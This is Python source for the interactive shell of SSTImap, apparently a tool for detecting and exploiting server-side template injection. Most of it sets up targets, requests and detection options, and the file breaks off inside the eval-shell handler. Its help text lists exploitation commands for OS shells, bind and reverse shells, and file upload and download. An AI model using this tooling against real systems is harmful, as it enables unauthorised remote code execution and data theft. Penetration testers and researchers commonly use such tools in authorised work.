import cmd
import json
import os

from utils import config
from utils.loggers import log, no_colour
from urllib import parse
from core import checks
from core.channel import Channel
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
from core.tcpclient import TcpClient
import socket


class InteractiveShell(cmd.Cmd):
    """Interactive mode shell."""
    def __init__(self, args):
        cmd.Cmd.__init__(self)
        self.prompt = "SSTImap> "
        self.core_prompt = ""
        self.sstimap_options = args.copy()
        self.sstimap_options.update({"tpl_shell": False, "tpl_cmd": None, "os_shell": False, "os_cmd": None,
                                     "bind_shell": None, "reverse_shell": None, "upload": None, "download": None,
                                     "eval_shell": False, "eval_cmd": None, "load_urls": None, "load_forms": None,
                                     "save_urls": None, "save_forms": None, "loaded_urls": set(), "loaded_forms": set()})
        if self.sstimap_options["url"]:
            self.do_url(args.get("url"))
            self.channel = Channel(self.sstimap_options)
        if args["load_urls"]:
            self.do_load_urls(args["load_urls"])
        if args["load_forms"]:
            self.do_load_forms(args["load_forms"])
        self.current_plugin = None
        self.checked = False
        if args["run"]:
            self.do_run("")

    def set_module(self, module):
        self.core_prompt = module
        if not self.sstimap_options.get("colour", True):
            module = no_colour(module)
        self.prompt = f"SSTImap{f' ({module})' if module else ''}> "

    def default(self, line):
        log.log(22, f'Invalid interactive command: {line.split(" ", 1)[0].lower()}. '
                    f"Type 'help' to see available commands.")

    def emptyline(self):
        pass

# Information commands

    def do_help(self, line):
        log.log(23, """SSTImap is an automatic SSTI detection and exploitation tool with predetermined and interactive modes.

SSTImap:
  ?, help                                 Show this help message
  version                                 Print SSTImap version
  opt, options                            Display current SSTImap options
  info                                    Show information about detection results
  reload, reload_modules                  Reload all SSTImap plugins and data types
  modules, module [MODULE]                List all modules or provide info about MODULE
  config [PATH]                           Update settings from config file or directory
  color, colour                           Enable/disable colorful output

Target:
  url, target [URL]                       Set target URL (e.g. 'https://example.com/?name=test')
  load_urls [PATH]                        Load URLs from txt file or directory
  load_forms [PATH]                       Load forms from json file or directory
  run, test, check                        Run SSTI detection on the target

Request:
  mark, marker [MARKER]                   Set string as injection marker (default '*')
  data, post {rm} [DATA]                  Add request body data to send (e.g. 'param=value'). To remove by prefix, use "data rm PREFIX". Whithout arguments, clears all data
  type, data_type [TYPE]                  Select request body processing script for a specific data type (default 'auto')
  data_params {rm} [PARAM]                Add request body processing param as KEY=VALUE. To remove by key, use "data_params rm KEY". Whithout arguments, clears all params
  header, headers {rm} [HEADER]           Add header to send (e.g. 'Header: Value'). To remove by prefix, use "header rm PREFIX". Whithout arguments, clears all headers
  cookie, cookies {rm} [COOKIE]           Cookie to send (e.g. 'Field=Value'). To remove by prefix, use "cookie rm PREFIX". Whithout arguments, clears all cookies
  method, http_method [METHOD]            Set HTTP method to use (default 'GET')
  agent, user_agent [AGENT]               Set User-Agent header value to use
  random, random_agent                    Toggle using random User-Agent header value from a list of desktop browsers on every request
  delay [DELAY]                           Delay between requests (Default/0: no delay)
  proxy [PROXY]                           Use a proxy to connect to the target URL
  ssl, verify_ssl                         Toggle verifying SSL certificates (not verified by default)
  log_response                            Toggle including HTTP responses into ~/.sstimap/sstimap.log

Crawler:
  crawl [DEPTH]                           Crawl up to depth (0 - do not crawl)
  forms                                   Search page(s) for forms
  empty_forms                             Treat pages without params as GET forms
  exclude [PATTERN]                       RegEx pattern to exclude from crawler
  domains [DOMAINS]                       Crawl other domains: Y(es) / S(ubdomains) / N(o). Default: S
  save_urls [PATH]                        Save crawled URLs to txt file or directory (run or no PATH: reset)
  save_forms [PATH]                       Save crawled forms to json file or directory (run or no PATH: reset)

Detection:
  lvl, level [LEVEL]                      Set level of escaping to perform (1-5, Default: 1)
  force, force_level [LEVEL] [CLEVEL]     Force a LEVEL and CLEVEL to test
  engine [ENGINE]                         Check only this backend template engine. For all, use '*'
  technique [TECHNIQUE]                   Use techniques: R(endered) E(rror-based) B(oolean error-based blind) T(ime-based blind). Default: REBT
  bool_ok [PATTERN]                       RegEx to match when boolean error-based blind payload evaluates correctly, empty to disable
  bool_err [PATTERN]                      RegEx to match when boolean error-based blind payload causes an error, empty to disable
  bool_match [PARAMS]                     Comma-separated list of matching params or 'all'. Default: code,header_count,cookie_count,byte_len,body_len,body_words,body_lines,encoding,redirects,time,url,content_type,server
  bool_match_min [MIN_PARAMS]             Minimum amount of usable params for matching. Default: 7
  bool_fuzzy [STABLE] [ERROR]             Allow small deviations in some of the matching parameters. Default: 0.05 0.1
  bool_samples [COUNT] [MIN] [MAX]        Amount of tests to profile the page and payload sizes. Default: 10 1 7
  blind_delay [DELAY]                     Delay to detect time-based blind injection (Default: 4 seconds)
  verify_delay [DELAY]                    Delay to verify and exploit time-based blind injection (Default: 30 seconds)
  legacy                                  Toggle including old payloads, that no longer work with newer versions of the engines
  generic                                 Toggle skipping dedicated payloads for generic engines to speed up detection

Exploitation:
  tpl, tpl_shell                          Prompt for an interactive shell on the template engine
  tpl_code [CODE]                         Inject code in the template engine
  eval, eval_shell                        Prompt for an interactive shell on the template engine base language
  eval_code [CODE]                        Evaluate code in the template engine base language
  !, os, shell, os_shell                  Prompt for an interactive operating system shell
  os_cmd [COMMAND]                        Execute an operating system command
  bind, bind_shell [PORT]                 Spawn a system shell on a TCP PORT of the target and connect to it
  reverse, reverse_shell [HOST] [PORT]    Run a system shell and back-connect to local HOST PORT
  remote_shell [SHELL]                    Set expected system shell on the target (default '/bin/sh')
  overwrite, force_overwrite              Toggle file overwrite when uploading
  up, upload [LOCAL] [REMOTE]             Upload LOCAL to REMOTE files
  down, download [REMOTE] [LOCAL]         Download REMOTE to LOCAL files""")

    def do_version(self, line):
        """Show current SSTImap version"""
        log.log(23, f'Current SSTImap version: {self.sstimap_options["version"]}')

    def do_config(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/config.json"
            if os.path.exists(line):
                custom_config = {}
                with open(line, 'r') as stream:
                    try:
                        custom_config = json.load(stream)
                    except json.JSONDecodeError as e:
                        log.log(25, f'Error while loading config: {repr(e)}')
                config.config_update(self.sstimap_options, custom_config)
                log.log(24, f'Config updated from file: {line}')
                return
        log.log(25, 'Provide file or directory to read config from.')

    def do_options(self, line):
        """Show current SSTImap options"""
        crawl_domains = {"Y": "Yes", "S": "Subdomains only", "N": "No"}
        log.log(23, f'Current SSTImap {self.sstimap_options["version"]} interactive mode options:')
        if not self.sstimap_options["url"] and not self.sstimap_options["loaded_urls"] \
                and not self.sstimap_options["loaded_forms"]:
            log.log(25, f'URL is not set.')
        elif self.sstimap_options["loaded_forms"]:
            log.log(26, f'Forms to scan: {len(self.sstimap_options["loaded_forms"])}')
            if self.sstimap_options["forms"]:
                ulen = 1 if self.sstimap_options["url"] else 0
                if self.sstimap_options["loaded_urls"]:
                    ulen += len(self.sstimap_options["loaded_urls"])
                log.log(26, f'URLs to scan: {ulen}')
        elif self.sstimap_options["loaded_urls"]:
            log.log(26, f'URLs to scan: '
                        f'{len(self.sstimap_options["loaded_urls"]) + (1 if self.sstimap_options["url"] else 0)}')
        else:
            log.log(26, f'URL: {self.sstimap_options["url"]}')
            if self.checked:
                log.log(24, f'Injection found')
        log.log(26, f'Injection marker: {self.sstimap_options["marker"]}')
        if self.sstimap_options["data"]:
            data = "\n    ".join(self.sstimap_options["data"])
            log.log(26, f'Request body data:\n    {data}')
            log.log(26, f'Request body type: {self.sstimap_options["data_type"]}')
            if self.sstimap_options["data_params"]:
                params = "\n    ".join([f"{x}: {self.sstimap_options['data_params'][x]}"
                                        for x in self.sstimap_options["data_params"]])
                log.log(26, f'Request body type params:\n    {params}')
        if self.sstimap_options["headers"]:
            headers = "\n    ".join(self.sstimap_options["headers"])
            log.log(26, f'HTTP headers:\n    {headers}')
        if self.sstimap_options["cookies"]:
            cookies = "\n    ".join(self.sstimap_options["cookies"])
            log.log(26, f'Cookies:\n    {cookies}')
        log.log(26, f'HTTP method: '
                    f'{self.sstimap_options["method"] if self.sstimap_options["method"] else "Detect automatically"}')
        if self.sstimap_options["random_agent"]:
            log.log(26, 'User-Agent is randomised')
        else:
            log.log(26, f'User-Agent: {self.sstimap_options["user_agent"]}')
        if self.sstimap_options["delay"]:
            log.log(26, f'Delay between requests: {self.sstimap_options["delay"]}s')
        if self.sstimap_options["proxy"]:
            log.log(26, f'Proxy: {self.sstimap_options["proxy"]}')
        log.log(26, f'Verify SSL: {self.sstimap_options["verify_ssl"]}')
        if self.sstimap_options["force_level"]:
            log.log(26, f'Forced level: {self.sstimap_options["force_level"][0]}')
            log.log(26, f'Forced context level: {self.sstimap_options["force_level"][1]}')
        else:
            log.log(26, f'Level: {self.sstimap_options["level"]}')
        log.log(26, f'Engine: {self.sstimap_options["engine"] if self.sstimap_options["engine"] else "*"}'
                    f'{"+" if not self.sstimap_options["engine"] and self.sstimap_options["legacy"] else ""}'
                    f'{"»" if not self.sstimap_options["engine"] and not self.sstimap_options["generic"] else ""}')
        if self.sstimap_options["crawl_depth"] > 0:
            log.log(26, f'Crawler depth: {self.sstimap_options["crawl_depth"]}')
            if self.sstimap_options["crawl_exclude"]:
                log.log(26, f'Crawler exclude RegEx: "{self.sstimap_options["crawl_exclude"]}"')
            log.log(26, f'Crawl other domains: {crawl_domains.get(self.sstimap_options["crawl_domains"].upper())}')
        else:
            log.log(26, 'Crawler: no crawl')
        log.log(26, f'Form detection: {self.sstimap_options["forms"]}')
        if self.sstimap_options["forms"]:
            log.log(26, f'Allow empty forms: {self.sstimap_options["empty_forms"]}')
        log.log(26, f'Attack technique: {self.sstimap_options["technique"]}')
        if "B" in self.sstimap_options["technique"]:
            if self.sstimap_options["boolean_regex_ok"]:
                log.log(26, f'Boolean error-based blind detection: RegEx (Normal page)')
                log.log(26, f'Boolean error-based blind RegEx: {self.sstimap_options["boolean_regex_ok"]}')
            elif self.sstimap_options["boolean_regex_err"]:
                log.log(26, f'Boolean error-based blind detection: RegEx (Error page)')
                log.log(26, f'Boolean error-based blind RegEx: {self.sstimap_options["boolean_regex_err"]}')
            else:
                log.log(26, f'Boolean error-based blind detection: Match pages')
                if self.sstimap_options["boolean_match"] not in ["", "*", "all"]:
                    match_params = "\n    ".join(self.sstimap_options["boolean_match"].split(","))
                    log.log(26, f'Boolean error-based blind matching params:\n    {match_params}')
                else:
                    log.log(26, f'Boolean error-based blind matching params: all')
                log.log(26, f'Boolean minimum usable matching params: {self.sstimap_options["boolean_match_min"]}')
                log.log(26, f'Boolean maximum stable fuzzy matching deviation: {self.sstimap_options["boolean_fuzzy"][0]}')
                log.log(26, f'Boolean minimum error fuzzy matching deviation: {self.sstimap_options["boolean_fuzzy"][1]}')
                log.log(26, f'Boolean matching normal page samples: {self.sstimap_options["boolean_samples"][0]}')
                log.log(26, f'Boolean matching sample size: {self.sstimap_options["boolean_samples"][1]}-'
                            f'{self.sstimap_options["boolean_samples"][2]}')
        if "T" in self.sstimap_options["technique"]:
            log.log(26, f'Time-based blind detection delay: {self.sstimap_options["time_based_blind_delay"]}')
            log.log(26, f'Time-based verification and exploitation delay: {self.sstimap_options["time_based_verify_blind_delay"]}')
        log.log(26, f'Force overwrite files: {self.sstimap_options["force_overwrite"]}')
        log.log(26, f'Expected remote shell: {self.sstimap_options["remote_shell"]}')
        if self.sstimap_options["log_response"]:
            log.log(26, 'HTTP responses will be included into ~/.sstimap/sstimap.log')

    do_opt = do_options

    def do_module(self, line):
        """List modules or show module info"""
        checks.module_info(line)

    do_modules = do_module

    def do_info(self, line):
        """Show information about the capabilities of a detected SSTI"""
        if not self.checked:
            log.log(25, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        checks.print_injection_summary(self.channel)

# Target commands

    def do_url(self, line):
        """Set target URL"""
        if line == '':
            log.log(22, 'Target URL cannot be empty.')
            return
        url = parse.urlparse(line)
        if url.netloc == '':
            log.log(22, 'Unable to parse target URL.')
            return
        log.log(24, f'Target URL is set to {line}')
        self.sstimap_options["url"] = line
        if not (self.sstimap_options['loaded_forms'] or self.sstimap_options['loaded_urls']):
            self.set_module(f'\033[31m{url.netloc}\033[0m')
        self.checked = False

    do_target = do_url

    def do_load_urls(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/urls.txt"
            if os.path.exists(line):
                try:
                    with open(line, 'r') as stream:
                        self.sstimap_options["loaded_urls"] = set([x.strip() for x in stream.readlines()])
                    log.log(21, f"Loaded {len(self.sstimap_options['loaded_urls'])} URL(s) from file: {line}")
                    if not self.sstimap_options['loaded_forms']:
                        self.set_module(f"\033[31m{len(self.sstimap_options['loaded_urls'])} URLs\033[0m")
                    self.checked = False
                except Exception as e:
                    log.log(22, f"Error occurred while loading URLs from file:\n{repr(e)}")
                return
            log.log(25, 'Provide valid file or directory to read URLs from.')
        else:
            self.sstimap_options["loaded_urls"] = None
            if not self.sstimap_options['loaded_forms']:
                self.set_module(f'\033[31m{parse.urlparse(self.sstimap_options["url"]).netloc}'
                                f'\033[0m' if self.sstimap_options["url"] else "")

    def do_load_forms(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/forms.json"
            if os.path.exists(line):
                try:
                    with open(line, 'r') as stream:
                        self.sstimap_options["loaded_forms"] = set([tuple(x) for x in json.load(stream)])
                    log.log(21, f"Loaded {len(self.sstimap_options['loaded_forms'])} forms from file: {line}")
                    self.set_module(f"\033[31m{len(self.sstimap_options['loaded_forms'])} forms\033[0m")
                    self.checked = False
                except Exception as e:
                    log.log(22, f"Error occurred while loading forms from file:\n{repr(e)}")
                return
            log.log(25, 'Provide valid file or directory to read forms from.')
        else:
            self.sstimap_options["loaded_forms"] = None
            if self.sstimap_options['loaded_urls']:
                self.set_module(f"\033[31m{len(self.sstimap_options['loaded_urls'])} URLs\033[0m")
            else:
                self.set_module(f'\033[31m{parse.urlparse(self.sstimap_options["url"]).netloc}'
                                f'\033[0m' if self.sstimap_options["url"] else "")

    def do_save_urls(self, line):
        if line:
            if self.sstimap_options.get('crawled_urls', None):
                if os.path.isdir(line):
                    line = f"{line}/sstimap_urls.txt"
                try:
                    with open(line, 'w') as stream:
                        stream.write("\n".join(self.sstimap_options['crawled_urls']))
                    log.log(21, f"Saved URLs to file: {line}")
                except Exception as e:
                    log.log(22, f"Error occurred while saving URLs to file:\n{repr(e)}")
            else:
                log.log(25, 'No URLs crawled to save.')
            return
        log.log(25, 'Provide valid file or directory to save URLs to.')

    def do_save_forms(self, line):
        if line:
            if self.sstimap_options.get('crawled_forms', None):
                if os.path.isdir(line):
                    line = f"{line}/sstimap_forms.json"
                try:
                    with open(line, 'w') as stream:
                        json.dump([x for x in self.sstimap_options['crawled_forms']], stream, indent=4)
                    log.log(21, f"Saved forms to file: {line}")
                except Exception as e:
                    log.log(22, f"Error occurred while saving forms to file:\n{repr(e)}")
            else:
                log.log(25, 'No forms detected to save.')
            return
        log.log(25, 'Provide valid file or directory to save forms to.')

    def do_crawl(self, line):
        if not line.isnumeric():
            line = "0"
        self.sstimap_options['crawl_depth'] = int(line)
        if int(line):
            log.log(24, f'Crawling depth is set to {line}.')
        else:
            log.log(24, 'Crawling disabled.')
        
    def do_exclude(self, line):
        self.sstimap_options['crawl_exclude'] = line
        if line:
            log.log(24, f'Crawler exclude RegEx is set to "{line}".')
        else:
            log.log(24, 'Crawler exclude RegEx disabled.')
    
    do_crawl_exclude = do_exclude
    do_crawlexclude = do_exclude
        
    def do_forms(self, line):
        overwrite = not self.sstimap_options['forms']
        log.log(24, f'Form detection {"en" if overwrite else "dis"}abled.')
        self.sstimap_options['forms'] = overwrite

    def do_empty_forms(self, line):
        overwrite = not self.sstimap_options['empty_forms']
        log.log(24, f'Empty form processing {"en" if overwrite else "dis"}abled.')
        self.sstimap_options['empty_forms'] = overwrite

    def do_color(self, line):
        colour = not self.sstimap_options['colour']
        self.sstimap_options['colour'] = colour
        from utils.loggers import formatter
        formatter.colour = colour
        self.set_module(self.core_prompt)
        log.log(24, f'Colorful output {"en" if colour else "dis"}abled.')

    do_colour = do_color

    def do_run(self, line):
        """Check target URL for SSTI vulnerabilities"""
        if not (self.sstimap_options["url"] or self.sstimap_options["loaded_urls"] or self.sstimap_options["loaded_forms"]):
            log.log(22, 'Target URL cannot be empty.')
            return
        try:
            self.current_plugin, self.channel = checks.scan_website(self.sstimap_options)
        except (KeyboardInterrupt, EOFError):
            log.log(26, 'Exiting SSTI detection')
        if self.current_plugin:
            self.checked = True
        self.sstimap_options["loaded_urls"] = None
        self.sstimap_options["loaded_forms"] = None
        self.set_module(f'\033[3{"2" if self.checked else "1"}m'
                        f'{parse.urlparse(self.sstimap_options["url"]).netloc}'
                        f'\033[0m' if self.sstimap_options["url"] else "")

    do_check = do_run
    do_test = do_run

# Request commands

    def do_marker(self, line):
        """Set injection marker"""
        if line == '':
            log.log(22, 'Marker can\'t be empty.')
            return
        log.log(24, f'Marker is set to {line}')
        self.sstimap_options["marker"] = line

    do_mark = do_marker

    def do_data(self, line):
        """Modify request body data"""
        if line == "":
            log.log(24, f'Clearing all request body data...')
            self.sstimap_options["data"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing data starting with {command[1]}:')
            for data in self.sstimap_options["data"].copy():
                if data.startswith(command[1]):
                    log.log(26, f'Removing: {data}')
                    self.sstimap_options["data"].remove(data)
        else:
            log.log(24, f'Adding request body data: {line}')
            self.sstimap_options["data"].append(line)

    do_post = do_data

    def do_data_params(self, line):
        """Modify request body data processing params"""
        if line == "":
            log.log(24, f'Clearing all request body data processing params...')
            self.sstimap_options["data_params"] = {}
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing data param {command[1]}:')
            self.sstimap_options["data_params"].pop(command[1], None)
        else:
            param = line.split("=", 1)
            log.log(24, f'Adding data param: {param[0]}')
            self.sstimap_options["data_params"][param[0]] = param[1]

    def do_header(self, line):
        """Modify HTTP headers"""
        if line == "":
            log.log(24, f'Clearing all HTTP headers...')
            self.sstimap_options["headers"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing HTTP headers starting with {command[1]}:')
            for header in self.sstimap_options["headers"].copy():
                if header.startswith(command[1]):
                    log.log(26, f'Removing: {header}')
                    self.sstimap_options["headers"].remove(header)
        else:
            log.log(24, f'Adding HTTP header: {line}')
            self.sstimap_options["headers"].append(line)

    do_headers = do_header

    def do_cookie(self, line):
        """Modify cookies"""
        if line == "":
            log.log(24, f'Clearing all cookies...')
            self.sstimap_options["cookies"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing cookies starting with {command[1]}:')
            for cookie in self.sstimap_options["cookies"].copy():
                if cookie.startswith(command[1]):
                    log.log(26, f'Removing: {cookie}')
                    self.sstimap_options["cookies"].remove(cookie)
        else:
            log.log(24, f'Adding cookie: {line}')
            self.sstimap_options["cookies"].append(line)

    do_cookies = do_cookie

    def do_http_method(self, line):
        """Set HTTP method"""
        if line == '':
            log.log(22, 'HTTP method cannot be empty.')
            return
        line = line.upper()
        log.log(24, f'HTTP method is set to {line}')
        self.sstimap_options["method"] = line

    do_method = do_http_method

    def do_data_type(self, line):
        """Set request body type"""
        if line == '':
            line = 'auto'
        line = line.lower()
        log.log(24, f'Request body type is set to {line}')
        self.sstimap_options["data_type"] = line

    do_type = do_data_type

    def do_user_agent(self, line):
        """Set User-Agent"""
        if line == '':
            log.log(22, 'User-Agent cannot be empty.')
            return
        log.log(24, f'User-Agent is set to {line}')
        self.sstimap_options["user_agent"] = line

    do_agent = do_user_agent

    def do_random_agent(self, line):
        """Switch random_user_agent option"""
        overwrite = not self.sstimap_options["random_agent"]
        log.log(24, f'User agent randomisation {"en" if overwrite else "dis"}abled')
        self.sstimap_options["random_agent"] = overwrite

    do_random = do_random_agent

    def do_delay(self, line):
        """Set DELAY between requests"""
        try:
            self.sstimap_options["delay"] = max(float(line), 0)
        except:
            log.log(22, 'Invalid delay time.')
            return
        log.log(24, f'Delay between requests is set to {self.sstimap_options["delay"]}')

    do_request_delay = do_delay

    def do_proxy(self, line):
        """Use proxy"""
        if line == "":
            log.log(24, f'Disabling proxy...')
            self.sstimap_options["proxy"] = None
            return
        log.log(24, f'Setting proxy to {line}')
        self.sstimap_options["proxy"] = line

    def do_verify_ssl(self, line):
        """Switch verify_ssl option"""
        overwrite = not self.sstimap_options["verify_ssl"]
        log.log(24, f'SSL verification {"en" if overwrite else "dis"}abled')
        self.sstimap_options["verify_ssl"] = overwrite

    do_ssl = do_verify_ssl

    def do_log_response(self, line):
        """Switch log_response option"""
        overwrite = not self.sstimap_options["log_response"]
        log.log(24, f'Response logging {"en" if overwrite else "dis"}abled')
        self.sstimap_options["log_response"] = overwrite

# Detection commands

    def do_level(self, line):
        """Set LEVEL to check for escapes"""
        if line == '' or not line.isnumeric() or len(line) > 1:
            log.log(22, 'Invalid LEVEL value.')
            return
        level = int(line)
        log.log(24, f'Escaping level is set to {level}')
        self.sstimap_options["level"] = level

    do_lvl = do_level

    def do_force_level(self, line):
        """Force LEVEL and CLEVEL to check"""
        if line == "":
            log.log(24, f'Disabling forced template escaping level and language context level')
            self.sstimap_options["force_level"] = None
            return
        line = line.split(" ")
        if len(line) != 2 or not line[0].isnumeric() or len(line[0]) > 1 or not line[1].isnumeric() or len(line[1]) > 1:
            log.log(22, 'Invalid LEVEL or CLEVEL value.')
            return
        force_level = (int(line[0]), int(line[1]),)
        log.log(24, f'Forcing template escaping level {force_level[0]} and language context level {force_level[1]}')
        self.sstimap_options["force_level"] = force_level

    do_force = do_force_level

    def do_engine(self, line):
        """Set template ENGINE to check"""
        if line.lower() in ['', '*', 'all']:
            line = None
        log.log(24, f'Template engine is set to {line if line else "*"}')
        self.sstimap_options["engine"] = line

    def do_technique(self, line):
        """Set attack TECHNIQUE to check"""
        line = line.upper()
        technique = ""
        for t in line:
            if t in ["R", "E", "B", "T"] and t not in technique:
                technique += t
                line = line.replace(t, "")
        if technique == "":
            log.log(22, 'Invalid TECHNIQUE value. It must contain at least one of \'R\', \'E\', \'B\' or \'T\'.')
            return
        if line != "":
            log.log(22, 'Invalid TECHNIQUE value. It must only contain \'R\', \'E\', \'B\' and \'T\'.')
            return
        log.log(24, f'Attack technique is set to {technique}')
        self.sstimap_options["technique"] = technique

    def do_remote_shell(self, line):
        """Set expected remote shell"""
        log.log(24, f'Expected remote shell is set to {line}')
        self.sstimap_options["remote_shell"] = line

    def do_crawl_domains(self, line):
        """Set crawling DOMAINS behaviour"""
        line = line.upper()
        if line not in ["Y", "S", "N"]:
            log.log(22, 'Invalid DOMAINS value. It should be \'Y\', \'S\' or \'N\'.')
            return
        log.log(24, f'Domain crawling is set to {line}')
        self.sstimap_options["crawl_domains"] = line

    do_domains = do_crawl_domains

    def do_bool_ok(self, line):
        self.sstimap_options['boolean_regex_ok'] = line
        if line:
            log.log(24, f'Boolean error-based blind normal page RegEx is set to "{line}".')
        else:
            log.log(24, 'Boolean error-based blind normal page RegEx disabled.')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(23, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29 if line else 23, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(29 if line else 23, 'Boolean error-based blind detection: Match pages')

    def do_bool_err(self, line):
        self.sstimap_options['boolean_regex_err'] = line
        if line:
            log.log(24, f'Boolean error-based blind error page RegEx is set to "{line}".')
        else:
            log.log(24, 'Boolean error-based blind error page RegEx disabled.')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29 if line else 23, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(23, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(29 if line else 23, 'Boolean error-based blind detection: Match pages')

    def do_bool_match(self, line):
        if line not in ["", "*", "all"]:
            self.sstimap_options['boolean_match'] = line
            match_params = "\n    ".join(self.sstimap_options["boolean_match"].split(","))
            log.log(24, f'Boolean error-based blind matching params:\n    {match_params}')
        else:
            self.sstimap_options['boolean_match'] = "all"
            log.log(24, 'Boolean error-based blind matching params: all')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(23, 'Boolean error-based blind detection: Match pages')

    def do_bool_match_min(self, line):
        if not line.isnumeric() or not (0 < int(line) < 14):
            line = "13"
        self.sstimap_options['boolean_match_min'] = int(line)
        log.log(24, f'Boolean minimum stable matching params is set to {int(line)}')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(23, 'Boolean error-based blind detection: Match pages')

    def do_bool_fuzzy(self, line):
        line = line.split(" ")
        try:
            boolean_fuzzy = (float(line[0]), float(line[1]),)
        except:
            log.log(22, 'Invalid STABLE or ERROR value.')
            return
        self.sstimap_options["boolean_fuzzy"] = boolean_fuzzy
        log.log(24, f'Fuzzy matching allows deviation of {boolean_fuzzy[0]} for stable params')
        log.log(24, f'Fuzzy matching requires deviation of {boolean_fuzzy[1]} to detect error')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(23, 'Boolean error-based blind detection: Match pages')

    def do_bool_samples(self, line):
        line = line.split(" ")
        try:
            boolean_samples = (int(line[0]), int(line[1]), int(line[2]),)
        except:
            log.log(22, 'Invalid COUNT, MIN or MAX value.')
            return
        self.sstimap_options["boolean_samples"] = boolean_samples
        log.log(24, f'Matcher will try {boolean_samples[0]} payloads of {boolean_samples[0]}-{boolean_samples[0]}'
                    f' characters to profile the page')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Normal page)')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, 'Boolean error-based blind detection: RegEx (Error page)')
        else:
            log.log(23, 'Boolean error-based blind detection: Match pages')

    def do_blind_delay(self, line):
        """Set DELAY for blind SSTI detection"""
        try:
            self.sstimap_options["time_based_blind_delay"] = max(int(line), 1)
        except:
            log.log(22, 'Invalid time-based blind injection delay time.')
            return
        log.log(24, f'Delay for time-based blind injection detection is set to {self.sstimap_options["time_based_blind_delay"]}')

    do_time_based_blind_delay = do_blind_delay

    def do_verify_delay(self, line):
        """Set DELAY for blind SSTI detection"""
        try:
            self.sstimap_options["time_based_verify_blind_delay"] = max(int(line), 1)
        except:
            log.log(22, 'Invalid time-based blind injection delay time.')
            return
        log.log(24, f'Delay for time-based blind injection verification and exploitation is set to {self.sstimap_options["time_based_verify_blind_delay"]}')

    do_verify_blind_delay = do_verify_delay

    def do_legacy(self, line):
        """Switch legacy option"""
        overwrite = not self.sstimap_options["legacy"]
        log.log(24, f'{"En" if overwrite else "Dis"}abled legacy plugins')
        self.sstimap_options["legacy"] = overwrite

    def do_generic(self, line):
        """Switch generic option"""
        overwrite = not self.sstimap_options["generic"]
        log.log(24, f'{"En" if overwrite else "Dis"}abled dedicated plugins for generic template engines')
        self.sstimap_options["generic"] = overwrite

# Exploitation commands

    def do_tpl_shell(self, line):
        """Provide interactive multi-line template shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind') or self.channel.data.get('boolean'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            log.log(21, 'Inject multi-line template code. Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
                MultilineShell(call, f"{self.channel.data.get('engine', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template shell')
        else:
            log.log(22, 'No code evaluation capabilities have been detected on the target')

    do_tpl = do_tpl_shell

    def do_tpl_code(self, line):
        """Evaluate single template command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'Template command cannot be empty.')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind') or self.channel.data.get('boolean'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            try:
                print(call(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting template command execution')
        else:
            log.log(22, 'No template code evaluation capabilities have been detected on the target')

    def do_eval_shell(self, line):
        """Provide interactive multi-line template base language shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'True or False is returned whether the code evaluates to a truthful value or not.')
            log.log(21, 'Inject multi-line template base language code. '
                        'Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
                MultilineShell(self.current_plugin.evaluate_blind, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template base language shell')
        elif self.channel.data.get('evaluate'):
            log.log(21, 'Inject multi-line template base language code. '
                        'Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
